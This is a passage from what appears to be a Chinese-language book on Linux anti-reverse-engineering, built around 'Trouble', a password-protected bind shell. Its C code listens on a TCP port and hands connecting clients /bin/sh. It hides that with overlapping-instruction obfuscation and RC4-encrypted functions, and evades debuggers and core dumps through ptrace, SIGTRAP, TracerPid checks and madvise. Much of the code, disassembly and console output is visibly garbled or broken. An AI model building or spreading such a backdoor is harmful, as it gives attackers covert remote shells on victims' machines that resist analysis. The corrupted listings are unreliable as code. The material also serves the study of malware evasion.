.text:00000000000400778 dq 24A4C6D0A2B244, 0C0D9924C6B0244, 72A4C6D024A4
.text:00000000000400778 dq 446F862446A93, 0C50444460524, 2444C6D79332446A
.text:00000000000400778 dq 0C6F0124446A9C02, 0FFAE32E04, 0E7894D000002BE
.text:0000000000040078 dq 20BAFFFFB3ED38, 0C7894D8E4B000, 0FC0850000693E8
```

Radare2 对绝对跳转的处理甚至更差

```
[0x0003c]> quit
```

## 第 5 章：阻碍代码流分析

```asm
asm volatile(
    "push %%0\n"
    "ret\n"
    "string \\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    : : "g" (label_address));
```

```c
return_here:
XOR_STRING31(pass, password, 0xaa);

// 验证密码
return memcmp(undo_xor_string(pass, 32, 0xaa), p_password, 32) != 0;
```

所涉及的新代码是第一个汇编块。

### 重叠代码块

```asm
asm volatile(
    "mov_ins:\n"
    "mov $2283, %%rax\n"
    "xor %%rax, %%rax\n"
    "jz mov_ins+3\n"
    ".byte 0xe8\n"
    : 
    : "%%rax");
```

这可能并不是这里实际发生的全部，所以让我们看看反汇编结果。

### IDA 中的重叠指令

```disasm
.text:00000000040076D mov_ins      ; CODE XREF:.text:000000000400777
.text:00000000040076D 48 C7 C0 EB 08 00  mov rax, 8Eh
.text:000000000400774 48 31 00        xor rax, rax
.text:000000000400777 74 F7           jz short near ptr mov_ins+3
.text:000000000400779 E48 31 C0 74      call near ptr 750038C6h
.text:000000000400779                                     ____
.text:00000000040077E 01                               db 1
```

从`mov_ins`开始的这段代码：

- 将`0xe8b1`移动`rax`
- 清空`rax`
- 跳转到`mov_ins`标签加三的位置

第三步是有趣的部分，因为`mov_ins+3`正好位于原始`mov`指令的中间。`mov_ins+3`处有指令吗？为了测试这种情况，取消定义`mov_ins`开始的代码并将`mov_ins+3`标记为代码。IDA 的发现结果如下：

### 在 `mov_ins+3` 处发现有效代码

```disasm
.text:00000000040076D 48 mov_ins      db 48h ; H
.text:00000000040076E C7               db 0C7h ; |
.text:00000000040076F 60               db 0C0h ; +
.text:0000000004007770 48 E6 08        jmp short loc_40077A
.text:0000000004007770                                     ____
.text:0000000004007772               db 0
.text:0000000004007773 00               db 0
.text:0000000004007774 48               db 48h ; H
.text:0000000004007775 31               db 31h ; 1
.text:0000000004007776 C0               db 0C0h ; +
.text:0000000004007777 74               db 74h ; t
.text:0000000004007778 F7               db 0F7h ;
.text:0000000004007779 E8               db 0E8h ; F
.text:000000000400777A                                     ____
.text:000000000400777A
```

```disasm
.text:000000000400777A loc_40077A; CODE XREF: .text:000000000400770
.text:000000000400777A 48 31 C0 xor rax, rax
.text:00000000040077D 74 01 jz short near ptr always_here+1
```

你可以看到`mov_ins+3`处有一个有效的跳转。该跳转跳过了`asm`块中定义的剩余代码，直到下一位。这就是秘诀！我们利用`mov`指令中的字节隐藏了指向后续代码的跳转。

## 第 6 章：逃避调试器

在本章中，你将使用`chap-6_debugger`目录下的 Trouble 版本。此版本使用了你在书中学过的许多混淆技术。

### 在捕获 GDB 等调试器之前，你需要了解它们的原理

调试器运行的核心是`ptrace`系统调用。手册页说：`ptrace()`允许一个进程（跟踪者）观察并控制另一个进程（被跟踪者）的执行，并改变被跟踪者的内存和寄存器。它主要用于实现调试。`ptrace`的一个特点是一次只能有一个跟踪者。这意味着如果 GDB 正在跟踪，其他进程就无法跟踪 Trouble。从反调试的角度来看这非常有用，因为你可以通过简单的调用`ptrace()`判断调试器是否已附加。要尝试一下，更新 Trouble 的`main()`函数以检测跟踪。注意，以下代码还需要添加`<sys/ptrace.h>`。

### 通过 `ptrace()` 检测调试器

```c
int main(int argc, char* argv[])
{
    (void)argc;
    (void)argv;

    if (ptrace(PTRACE_TRACEME, 0, NULL) != 0) {
        fprintf(stderr, "Tracer detected!\n");
        exit(EXIT_FAILURE);
    }
}
```

使用`ptrace()`代码重新编译 Trouble并在 GDB 中运行，你会发现 Trouble 提前终止了。注意下面的“Tracer detected!”行。Trouble 在设置跟踪失败后提前退出。

然而，如果你不在 GDB 中运行 Trouble，它就能正常执行。这是为什么？你添加的新代码使用了`PTRACE_TRACEME`调用`ptrace`。如果 Trouble 不是通过 GDB 启动的，这个`PTRACE_TRACEME`调用会将父进程设置为跟踪者。在这种情况下，程序是`/bin/bash`。要确认这一点，运行 Trouble 并检查它的`/proc-<pid>/status`文件。这是你应该看到的示例。观察跟踪者 PID：

```
albino-lobster@ubuntu:-$ cat /proc/pidof trouble/status
Name:           trouble
State:          S (sleeping)
Tgid:           59935
Ngid:           0
Pid:            59935
PPid:           2402
TracerPid:     2402
```

上述最重要的两行是“PPid”（父进程 PID）和“TracerPid”。这两个值都显示为 2402。你可以使用`ps`命令确认它是 bash：

```
albino-lobster@ubuntu:-$ ps 2402 in ps
PID TTY STAT TIME COMMAND
2833 pts/17 Ss       0:00 bash
59953 pts/17 R+       0:00  \_ ps f
2402 pts/1 S        0:01 bash
59935 pts/1 S+       0:00  \_ ./trouble/trouble
```

如果 Trouble 是通过 GDB 执行的，那么你添加的`PTRACE_TRACEME`调用将失败，Trouble 将退出。这是因为 Trouble 已经被 GDB 跟踪了，它无法将父进程设置为跟踪者。记住，一次只能有一个跟踪者。通过这种方式，我们防止了基于`ptrace`的调试器附加到 Trouble。

另一个例子，考虑`gcore`工具。`gcore`是一个产生运行中程序核心转储的工具。如果程序使用了像 Trouble 那样的加壳器，这将特别有用，因为核心转储将导出程序的未加密版本，然后可以将其加载到 IDA 或其他反汇器中。然而，如果我们使用`PTRACE_TRACEME`逻辑，那么`gcore`将失败。

```
gcore 由于另一个进程正在跟踪而无法创建 core
albino-lobster@ubuntu:- sudo gcore pidof trouble
Could not attach to process. 如果你的 uid 与目标进程的 uid 匹配，请检查 /proc/sys/kernel/yama/ptrace_scope 的设置，或尝试以 root 用户身份运行。更多详情请参见 /etc/sysctl.d/10-ptrace.conf
warning: process 60023 is already traced by process 2402
ptrace: Operation not permitted.
You can't do without a process to debug.
The program is not being run.
gcore: failed to create core.60023
```

注意到 gcore 符合 Trouble 已经被进程 2402 跟踪了吗？

最后一个例子是`strace`工具。`trace`列出了程序执行的所有系统调用。由于对`ptrace`的使用，Trouble 能够检测到它。

```
使用 PTRACE_TRACEME 检测跟踪
albino-lobster@ubuntu:~antire_book/chap_6_debugger/dontpanic/build$ trace ./trouble\n/trouble
execve("../trouble/trouble", "[\../trouble/trouble"]], [/* 64 vars */]) = 0
arch_prctl(ARCH_SET_FS, 0x604240) = 0
set_tid_address(0x604278) = 61493
ptrace(PTRACE_TRACEME, 0, NULL) = -1 EPERM (Operation not permitted)
write(2, [""", 0], ["Tracer detected!\n", 17]), 2Tracer detected!
) = 17
exit_group(1) = =
+++ exited with 1 +++
```

### 捕获调试器

有一种不同但微小的方法检测调试器，而无需依赖`ptrace`。以下代码是 Trouble 的更新版本，使用了`SIGTRAP`信号。

## 第 6 章：规避调试器

### 使用 SIGTRAP 捕获调试器

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <sys/mman.h>
```



# 第 6 章：规避调试器

## 6.1 反调试代码

以下代码展示了 `Trouble` 程序中的反调试实现，包括密码校验、自修改代码和信号处理等关键部分。

```c
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ptrace.h>
#include "rc4.h"
#include "xor_string.h"
```

```c
extern void* check_password_size;
unsigned char check_password_key[128] __attribute__((section(".rc4_check_password"))) = { 0 };
```

```c
char* calc_addr(char* p_addr)
{
    return p_addr + 0x040000;
}
```

```c
bool __attribute__((optimize("01", section(".check_password"))))
check_password(const char* p_password)
{
    char pass[password_size] = {};
    char* label_address = volatile(
        asm volatile(
            "mov %n\n"
            "mov $2283, %%rax\n"
            "xor %%rax, %%rax\n"
            "jz mov_ins+3\n"
            ".byte 0xe8\n"
            :
            : "%rax");
```

```c
asm volatile(
    "xor %%rax, %%rax\n")
```

```c
"jz always_here + 1\n"
"always_here:\n"
".byte 0xe8\n"
: :
"%rax");
```

```c
asm volatile(
    "jz aligned+1\n"
    "jnz aligned+1\n"
    "unaligned:\n"
    ".byte 0xe8\n"
);
```

```c
label_address = calc_addr((char*)&&return_here) - 0x400000);
```

```c
asm volatile(
    "push %0\n"
    "ret\n"
    ".string \x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\"
    :
    : "g"(label_address));
```

```c
return_here:
XOR_STRING31(pass, password, @0aa);
// 验证密码
return memcmp(undo_xor_string(pass, 32, @0aa), p_password, 32) != 0;
```

```c
void trap_handler()
{
```

```c
int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
if (sock == -1)
{
    fprintf(stderr, "Failed to create the socket.");
    exit(EXIT_FAILURE);
}
```

```c
struct sockaddr_in bind_addr = {};
bind_addr.sin_family = AF_INET;
bind_addr.sin_s_addr = htonl(INADDR_ANY);
bind_addr.sin_port = htons(12770);
```

```c
int bind_result = bind(sock, (struct sockaddr*)&bind_addr,
                       sizeof(bind_addr));
if (bind_result != 0)
{
    perror("Bind call failed");
    exit(EXIT_FAILURE);
}
```

```c
int listen_result = listen(sock, 5);
if (listen_result != 0)
{
    perror("Listen call failed");
    exit(EXIT_FAILURE);
}
```

```c
while (true)
{
    int client_sock = accept(sock, NULL, NULL);
    if (client_sock < 0)
    {
        perror("Accept call failed");
        exit(EXIT_FAILURE);
    }
```

```c
    int child_pid = fork();
    if (child_pid == 0)
    {
        // 读取密码
        char password_input[password_size] = {};
        int read_result = read(client_sock, password_input, password_size - 1);
        if (read_result < (int)(password_size - 1))
        {
            close(client_sock);
            exit(EXIT_FAILURE);
        }
        // 解密有效目标
        struct rc4_state state = {};
        mprotect(check_password, (size_t)password_size, PROT_READ | PROT_WRITE);
        rc4_init(&state, check_password_key, sizeof(check_password_key));
        rc4_crypt(&state, (unsigned char*)check_password, (size_t)password_size);
        mprotect(check_password, (size_t)password_size, PROT_READ | PROT_EXEC);
        if (check_password(password_input))
        {
            close(client_sock);
            exit(EXIT_FAILURE);
        }
        dup2(client_sock, 0);
        dup2(client_sock, 1);
        dup2(client_sock, 2);
        char* empty[] = { NULL };
        char* bin[] = { '/', 'b', 'i', 'n', '/', 's', 'h', 0 };
        execve(bin, empty, empty);
        close(client_sock);
        exit(EXIT_SUCCESS);
    }
}
```

```c
int main(int argc, char* argv[])
{
    (void)argc;
    (void)argv;
    // 注册 trap 处理器处理 SIGTRAP
    struct sigaction sVal = {};
    sVal.sa_flags = SA_SIGINFO;
    sVal.sa_action = trap_handler;
    sigaction(SIGTRAP, &sVal, NULL);
    // 生成一个 sigtrap
    kill(getpid(), SIGTRAP);
    return EXIT_SUCCESS;
}
```

## 6.2 调试器检测与规避

如果你通过 GDB 运行此版本的 `Trouble`，它将直接退出而不调用 `trap_handler()`。`Trouble` 在触发 `SIGTRAP` 后过早退出。

```bash
albino_lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ gdb ./trouble
```

### 6.2.1 通过杀死子进程来生成 core 文件

```bash
albino-lobster@ubuntu:~$ ps fa
PID TTY      STAT TIME COMMAND
6352 pts/21 Ss       0:00 _ bash
6956 pts/21 R+       0:00 \_ ps fa
6230 pts/9 Ss       0:00 \_ sudo su
6942 pts/9 S        0:00 
6943 pts/9 S        0:00 \_ 
6944 pts/9 S        0:00 \_ ./trouble/trouble
6954 pts/9 S+       0:00 \_ ./trouble/trouble
6955 pts/9 S+       

albino-lobster@ubuntu:~$ sudo gcore 6954
```

```
Could not attach to process. If your waits match the uid of the target process, check the setting of /proc/sys/kernel/yama/ptrace_scope, or try gaining as the root user. For more details, see /etc/sysctl/10-ptrace.conf ptrace: warning: process 6954 is already traced by process 6955 ptrace: Operation not permitted.
You can't do that without a process to debug.
The program is not being run.
gore: failed to create core.6954
albino-lobster@ubuntu:~$ sudo kill -9 6955
albino-lobster@ubuntu:~$ sudo gcore 6954
0x00000000000401328 in __syscall ()
Saved corefile.6954
albino-lobster@ubuntu:~$
```

如你所见，在进程 6955 运行 `gcore` 之前，它无法为 6954 创建 core 文件。然而，在执行 `sudo kill -9 6955` 后，`gcore` 能够产生 core 文件。不过，你可以通过使用 `ptrace` 选项 `PTRACE_O_EXITKILL` 轻松地解决这个问题。当跟踪器被杀死时，它会向所有被跟踪进程发送 `SIGKILL` 信号。你可以更新代码如下：

```c
ptrace(PTRACE_SETOPTIONS, getppid(), NULL, PTRACE_TRACEFORK | PTRACE_O_EXITKILL);
```

现在，如果攻击者尝试杀死跟踪器，`Trouble` 就会随之消失。

```bash
albino-lobster@ubuntu:~~$ ps fa
PID TTY  STAT TIME COMMAND
6352 pts/21 Ss    0:00 bash
7071 pts/21 R+     0:00 _ ps fa
6230 pts/9 Ss       0:00 bash
7041 pts/9 S       0:00 _ sudo su
7042 pts/9 S       0:00 _ su
7043 pts/9 S       0:00 _ bash
7068 pts/9 S+     0:00 _ ./trouble/trouble
7069 pts/9 S+     0:00 _ ./trouble/trouble
albino-lobster@ubuntu:~~$ sudo gcore 7068
```

```
Could not attach to process. If your uid matches the uid of the target process, check the setting of /proc/sys/kernel/yama/ptrace_scope, or try as the root user. For more details, see /etc/sysctl.d/10-ptrace.conf warning: process 7068 is already traced by process 7069
trace: Operation not permitted.
You can't do that without a process to debug.
The program is not running.
```

```bash
gcore: failed to create core.7068
albino-lobster@ubuntu:~$ sudo kill 7069
albino-lobster@ubuntu:~$ sudo gcore 7068
ptrace: No such process.
```

```
You can't do that without a process to debug.
The program is not running.
```

```bash
gcore: failed to create core.7068
albino-lobster@ubuntu:~$ ps fa
PID TTY  STAT TIME COMMAND
6352 pts/21 Ss    0:00 bash
7086 pts/9 R+     0:00 _ ps fa
6230 pts/9 Ss     0:00 bash
7041 pts/9 S       0:00 _ sudo su
7042 pts/9 S       0:00 _ su
7043 pts/9 S+     0:00 _ bash
```

## 6.3 通过 /proc/status 检测调试器

在上一节中，你学习了如何使用分支跟踪器（forked tracer）来保护 `Trouble` 免受调试器攻击。虽然父进程 `Trouble` 受到了保护，但子进程跟踪器仍然容易被调试器挂载。可以通过什么方法缓解这一点？一种方法是可以使用 proc 文件系统查看是否有跟踪器正在跟踪它。这里是命令行的一个示例。

### 6.3.1 理解 /proc/status 的输出

```bash
albino-lobster@ubuntu:~$ ps fa
PID TTY STAT TIME COMMAND
6352 pts/21 Ss 0:00 bash
7126 pts/21 R+ 0:00 _ ps fa
6230 pts/9 Ss 0:00 bash
7111 pts/9 S 0:00 _ sudo su
7112 pts/9 S 0:00 _ su
7113 pts/9 S 0:00 _ bash
7123 pts/9 S+ 0:00 _ ./trouble
7124 pts/9 S+ 0:00 _ ../trouble
albino-lobster@ubuntu:~$ cat /proc/7123/status | grep Pid:
Pid: 7123
PPid: 7113
TracerPid: 7124
```

在上述输出中，我对 PID 7123 的状态文件进行了 `grep` 过滤。输出显示了当前 PID (7123)、父 PID (7113) 以及跟踪器的 PID (7124)。我们可以更新 `Trouble`，通过 `/proc/self/status` 查找这些信息。

### 6.3.2 在 /proc/self/status 中查找 TracerPid

检查 `/proc/self/status` 中的 `TracerPid` 字段。

```c
void check_proc_status() {
    FILE* stream = fopen("/proc/self/status", "r");
    if (stream == NULL) {
        return;
    }
    char line[1024];
    int pid = 0;
    while (fgets(line, sizeof(line), stream)) {
        char* tracer = strstr(line, "TracerPid:");
        if (tracer != NULL) {
            pid = atoi(tracer + 10);
            if (pid != 0) {
                // 调试器已挂载
                kill(getpid(), SIGKILL);
            }
        }
    }
    fclose(stream);
}
```

## 6.4 使用 madvise 增强防护

在上一节中，你介绍了一种检测调试器是否附加到 `Trouble` 跟踪子进程的新方法。然而，该方法无法防止像 `gore` 这样只附加并检测而不控制执行执行的实用工具。`gore` 仍然可以附加到 `Trouble` 的跟踪子进程。



`albino-lobster@ubuntu:~$ ps fa`
```
PID TTY      STAT TIME COMMAND
6369 pts/29 Ss+       0:00 bash
6352 pts/21 Ss        0:00 bash
16614 pts/21 R+       0:00 \_ ps fa
6230 pts/9 Ss        0:00 bash
16611 pts/9 S+        0:00 \_ /trouble/trouble
16612 pts/9 S+        0:00 \_ /trouble/trouble
16613 pts/9 S+        0:00 \_ /trouble/trouble
```
`albino-lobster@ubuntu:~$ sudo gore 16613`
```
0x000000000402374 in ~syscall()
Saved corefile.16613
```

如前所述，核心文件可以加载到 IDA 中，并提供一个剥离了许多混淆技术的 *Trouble* 查看。然而，Linux 中一个名为 *madvise()* 的函数，它允许我们将某些内存范围排除在核心文件之外。根据 man页：

> `madvise()` 系统调用用于向内核关于从 `addr` 开始且长度为 `length` 字节的地址范围提供建议或指示。最初，该系统调用支持一组“常规”建议值，这些值在多个实现中也可用。（但注意，`madvise()` 未在 POSIX 中规定。）随后，添加了许多 Linux 特有的建议值。

“Linux 特有的建议值”之一是 `MADV_DONTDUMP`。再次查看 `madvise` 页面：

![](img/fdf1e4bfff3995dc5a8580eb00fa23e5_224_0.png)

## 第 6 章：逃避调试器

`MADV_DONTDUMP`（自 Linux 3.4 起）将 `addr` 和 `length` 指定范围内的内容从核心储中排除。这对于具有大面积内存且已知不需要在核心储中的应用程序非常有用。`MADV_DONTDUMP` 的效果高于通过 `/proc/PID/coredump_filter` 文件设置的位掩码（参见 `core(5)`）。

使用 `madvise()`，你可以防止 `gore` 在加密器执行后转储 Trouble。唯一的真正挑战是通过程序化方法找到要传递给 `madvise()` 的地址。为此，我在第 6 章的 `dont` 目录下的 `madvise` 目录创建了另一个编译后工具。该项目通常包含两个文件。

`chap_6_debugger/dontpanicic/madvise/CMakeLists.txt`

```
project(madvise CXX)
cmake_minimum_required(VERSION 3.0)
```

```
set(CMAKE_CXX_FLAGS "Wall -Wextra -g")
```

```
add_executable(${PROJECT_NAME} src/madvise.cpp)
```

`chap_6_debugger/dontpanicic/madvise/src/madvise.cpp`

```
#include <cstdlib>
#include <iostream>
#include <fstream>
#include <iostream>
#include <cstring>
#include <elf.h>
```

```
/*
 * 解析程序头并存储第一个 LOAD 的地址/大小。
 * 节节表查找 ".madvise_base_addr" 和 ".madvise_size"，
 * 我们在其中存储了从 LOAD 段提取的地址和大小。
 *
 * \param[in,out] p_data ELF 二进制文件
 * \return 如果找到了两个 .madvise 节，则返回 true
 */
```

```
bool add_advise_info(std::string& p_data)
```

```
{
if (p_data[0] != 0x7f || p_data[1] != 'E' || p_data[2] != 'L' || p_data[3] != 'F')
    return false;
}
```

```
Elf64_hdr* ehdr = reinterpret_cast<Elf64_hdr*>(&p_data[0]);
Elf64_shdr* sections = reinterpret_cast<Elf64_shdr*>(&p_data[ehdr->e_shoff]);
uint16_t sections_count = ehdr->e_shnum;
if (sections_count == 0) {
    std::cerr << "[-] No section table" << std::endl;
    return false;
}
```

```
Elf64_shdr* sections_header = reinterpret_cast<Elf64_shdr*>(&p_data[ehdr->e_shoff] + ehdr->e_size);
const char* strings_table = &p_data[sections_header->sh_str];
```

`Elf64_Phdr* phdr = reinterpret_cast<Elf64_Phdr*>(&p_data[ehdr->e_off]);`

`uint64_t base_address = phdr->e_vaddr;`

`uint64_t size = phdr->e_size;`

```
int found = 0;

Elf64_shdr* current = sections;

for (int i = 0; i < sections_count; i++, current++) {

    std::string section_name(&strings_table[current->sh_name]);

    if (section_name.find(".madvise_base_addr") == 0) {

        memcpy(&p_data[0] + current->sh_offset, &base_address, sizeof(base_address));

        found++;

    } else if (section_name.find(".madvise_size") == 0) {

        memcpy(&p_data[0] + current->sh_offset, &size, sizeof(size));

        found++;

    }

}
```

```
return (found == 2);
```

```
int main(int argc, char** argv)

{

    if (argc != 2) {

        std::cerr << "Usage: ./madvise <file>" << std::endl;

        return EXIT_FAILURE;

    }

    std::ifstream inputFile(argv[1], std::ifstream::binary);

    if (!inputFile.is_open() || !inputFile.good()) {

        std::cerr << "Failed to open the file: " << argv[1] << std::endl;

        return EXIT_FAILURE;

    }

    std::string input((std::istambuf_iterator<char>(inputFile)),

                      std::istambuf_iterator<char>());

    inputFile.close();

    if(!add_advise_info(input)) {

        return EXIT_FAILURE;

    }

    std::ofstream outputFile(argv[1], std::ofstream::binary);

    if (!outputFile.is_open() || !outputFile.good()) {

        std::cerr << "Failed to open the file: " << argv[1] << std::endl;

        return EXIT_FAILURE;

    }

    outputFile.write(input.data(), input.length());

    outputFile.close();

    return EXIT_SUCCESS;

}
```

此工具将在节中查找 `.madvise_base_addr` 和 `.madvise_size`。工具会将程序头中找到的地址和大小复制到这些节中。

接下来更新 Trouble 以使用 `madvise` 工具。第一步是在 Trouble 的 `CMakeLists.txt` 中挂钩 `madvise`。

`chap_6_debugger/dontpanic/trouble/CMakeLists.txt`

```
project(Trouble C)

cmake_minimum_required(VERSION 3.0)

# 这将为 bind shell 创建 32 字节的 "password"。

# 该命令仅在运行 "cmake" 时执行，如果你想生成新密码，

# 应该从命令行运行 "cmake ..; make"。

execute_process("/bin/sh",
  ${CMAKE_CURRENT_SOURCE_DIR},
  ARGS "-c /dev/urandom | tr -dc a-zA-Z0-9 | head -c 32",
  OUTPUT_VARIABLE random_password)
```

### 将随机密码作为宏传递给 `${PROJECT_NAME}`

`add_definitions(-Dpassword="${random_password}" -Dpassword_size=32)`

```
set(CMAKE_C_COMPILER musl-gcc)
set(CMAKE_C_FLAGS "-Wall -Wextra -Wshadow -static -Wno-int-pointer-cast")
add_executable(${PROJECT_NAME} src/trouble.c src/rc4.c)
```

```
add_custom_target(addLDS
COMMAND sed -i -e 's,--${CMAKE_CURRENT_SOURCE_DIR}/trouble_layout.lds///g' .CMAKE/CMakeFiles/trouble.dir/link.txt)
```

```
add_dependencies(${PROJECT_NAME} addLDS)
```

```
# 构建成功后，向用户显示随机密码
add_custom_command(TARGET ${PROJECT_NAME} POST_BUILD
COMMAND ${CMAKE_COMMAND} -E echo
  "The bind shell password is: ${random_password}")
```

```
add_custom_command(TARGET ${PROJECT_NAME}
POST_BUILD
COMMAND ../encryptFunctions/encryptFunctions ${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_NAME}.elf)
```

```
add_custom_command(TARGET ${PROJECT_NAME})
add_custom_command(TARGET ${PROJECT_NAME}
  POST_BUILD
  COMMAND ../cryptor/cryptor $(CMAKE_CURRENT_BINARY_DIR)/${PROJECT_NAME}.elf)
```

还需要在 Trouble 中创建特殊的节。你在之前的章节中已经这样做，可以使用 `section` 属性创建特殊节。

在 Trouble 中添加 `.madvise` 节

```
extern void* check_password_size;
unsigned char check_password_key[128] __attribute__((section(".rc4_check_password"))) = { 0 };
uint32_t madvise_base __attribute__((section(".madvise_base_addr"))) = 0;
uint32_t madvise_size __attribute__((section(".madvise_size"))) = 0;
```

最后，在 Trouble 的代码跟踪器中添加 `madvise()` 调用。

更新跟踪器代码调用 `madvise()`

```
madvise((void*)madvise_base, madvise_size, MADV_DONTDUMP);

// 处理可能进入跟踪的任何信号
while (true)
```

现在如果你重新编译 Trouble，你应该看到 `madvise` 是构建过程的一部分。

Trouble build-`albino@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ make`

```
Scanning dependencies of target stripBinary

+   [ 7%] Building CXX object stripBinary/CMakeFiles/stripBinary.dir/src/stripBinary.cpp/

[ 14%] Linking CXX executable stripBinary

[ 14!] Built target stripBinary

Scanning dependencies of target fakeHeadersBit

[ 21%] Building CXX object fakeHeadersBit/CMakeFiles/fakeHeadersBit.dir/src/fakeHea/dersXBit.cpp.o

[ 28%] Linking CXX executable fakeHeadersBit
```

# 第 6 章：规避调试器

```
[ 28%] Built target fakeHeadersXBit
Scanning dependencies of target encryptFunctions
[ 35%] Building CXX object encryptFunctions/CMakeFiles/encryptFunctions.dir/src/encryptFunctions.cpp.o
[ 42%] Building CXX object encryptFunctions/CMakeFiles/encryptFunctions.dir/src/rc4.c.o
[ 50%] Linking CXX executable encryptFunctions
[ 50%] Built target encryptFunctions
Scanning dependencies of target madvise
[ 57%] Building CXX object madvise/CMakeFiles/madvise.dir/src/madvise.cpp.o
[ 64%] Linking CXX executable madvise
[ 64%] Built target madvise
Scanning dependencies of target cryptor
[ 71%] Building CXX object cryptor/CMakeFiles/cryptor.dir/src/cryptor.cpp.o
[ 78%] Linking CXX executable cryptor
[ 78%] Built target cryptor
Scanning dependencies of target addLDS
[ 78%] Built target addLDS
Scanning dependencies of target trouble
[ 85%] Building C object trouble/CMakeFiles/trouble.dir/src/trouble.c.o
[ 92%] Building C object trouble/CMakeFiles/trouble.dir/src/rc4.c.o
[100%] Linking C executable
The bind shell password is: Js117IWArnaXMEECpnjJ2EbMKQ0gZD
[+] Encrypted 0x3ef6
[100%] Built target trouble
```

现在，如果你使用 `gore` 创建了一个 core 文件，输出看起来完全一样。



```
albino-lobster@ubuntu:~$ ps fa
PID TTY         STAT  TIME COMMAND
2399 pts/1    Ss     0:00 bash
5713 pts/1    R+     0:00   _ _ ps fa
2135 pts/1    Ss     0:00 bash
5710 pts/1    S+     0:00   _ _ ./trouble/trouble
5711 pts/1    S+     0:00   _ _ ./trouble/trouble
5712 pts/11    S+     0:00   _ _ ./trouble/trouble
albino-lobster@ubuntu:~$ sudo gore 5712
[sudo] password for albino-lobster:
0x000000000004022a4 in __syscall ()
Saved corefile.5712
```

然而，如果你用 `readelf` 查看 core 的程序头（program headers），你会发现 `Trouble` 执行的 `0x400000` 范围缺失了。

`madvise` 消失了 `0x400000` 范围

```
albino-lobster@ubuntu:-$ readelf -l /core.5712
```

Elf file type is CORE (Core file)

Entry point 0x0

There are 6 program headers, starting at offset 0x

Program Headers:

| Type | Offset | VirtAddr | PhysAddr | Flags | Align |

| --- | --- | --- | --- | --- | --- |

| NOTE | FileSize | | | | |

| 0x0000000000000190 | 0x0000000000000000 | 0x0000000000000000 | | | |

| LOAD | 0x0000000000000090 | 0x0000000000000000 | | R | 1 |

| 0x0000000000000b60 | 0x0000000000000400 | | | | |

| 0x0000000000000200 | 0x0000000000000200 | | | RW | 1 |

| 0x00000000000002b0 | 0x00000000000007b0 | | | | |

| 0x0000000000000100 | 0x0000000000000100 | | | RW | 1 |

| LOAD | 0x00000000000003b0 | 0x0007fffe25f7600 | | | |

| 0x00000000000002100 | 0x0000000000002100 | | | RW | 1 |

| LOAD | 0x000000000000024b0 | 0x0007fffe25cc00 | | | |

| 0x0000000000000200 | 0x0000000000000200 | | | R E | 1 |

| LOAD | 0x00000000000002b0 | 0xffffffffffff | | E | 1 |

Section to Segment mapping:

Sections...

+00

01 load

02 load

03 load

如果你将 core 拖入 `IDA`，你会发现 `0x400000` 范围在 core 中不存在。这有效地隐藏了 `Trouble` 的所有技巧。

`IDA` 中生成的 `gcore` 文件顶部

```
0x0000000000604000 : Input SHA256 : 9384EEBF4F68E630F74FE0C6D7980A2259A38F9D85173E88
0x0000000000604000 : Input MD5 : 8843AE83C8AA5AD92EA12AB845
0x0000000000604000 : Input CRC32 : 3F22029C
0x0000000000604000 : File Name : C:\Users\ADMIN\AppData\Temp\vmware-Admin\instructor(6b890b0).core.5721
0x0000000000604000 : Format : ELF64 for x86-64 (Core file)
0x0000000000604000 : Imagebase : 604000
0x0000000000604000 : .686p
0x0000000000604000 : .mmx
0x0000000000604000 : .model flat
0x0000000000604000 : .intel_syntax noprefix
0x0000000000604000 : ===================
0x0000000000604000 : Segment type: Pure data
0x0000000000604000 : Segment permissions: Read/Write
0x0000000000604000 : segment byte public 'DATA' use64
0x0000000000604000 : assume cs:load
0x0000000000604000 : org 604000h
0x0000000000604000 : db 6Bh
0x0000000000604001 db 31h
```

在上一节中，你防止了混淆代码出现在 core dump 中。然而，允许生成 core 是否更好？到目前我一直使用 `gcore` 生成 core 文件。但并没有必要。可以通过向 `Trouble` 发正确的信号生成 core。

使用 `-11` 生成 core

```
albino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ ls -l
total 56
-rw-r--r-- 1 albino-lobster albino-lobster 13260 Dec 5 05:54 CMakeCache.txt
drwxr-xr-x 4 albino-lobster albino-lobster 4096 Dec 5 17:30 CMakeFiles
-rw-r--r-- 1 albino-lobster albino-lobster 2187 Dec 5 05:54 cmake_install.cmake
drwxr-xr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 cryptor
drwxr-xr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 encryptFunctions
drwxr-xr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 fakeHeadersXBit
drwxr-xr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 madvise
-rw-r--r-- 1 albino-lobster albino-lobster 7041 Dec 5 05:54 Makefile
drwxr-xr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 stripBinary
drwxr-xr-x 3 albino-lobster albino-lobster 4096 Dec 5 17:30 trouble
albino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ sudo ./trouble/trouble
 &
[1] 7773
albino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ ulimit -c
albino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ ps fa
PID TTY STAT TIME COMMAND
2135 pts/1 S 0:00 bash
7773 pts/1 S 0:00 sudo ./trouble/trouble
7774 pts/1 S 0:00 ./trouble/trouble
7776 pts/1 R+ 0:00 fa
albino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ sudo kill -11
7773
albino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ ls -l
total 228
-rw-r--r-- 1 albino-lobster albino-lobster 13260 Dec 5 05:54 CMakeCache.txt
drwxr-xr-x 4 albino-lobster albino-lobster 4096 Dec 5 17:30 CMakeFiles
-rw-r--r-- 1 albino-lobster albino-lobster 2187 Dec 5 05:54 cmake_install.cmake
-rw-r--r-- 1 root albino-lobster 17628 Dec 5 17:32 core
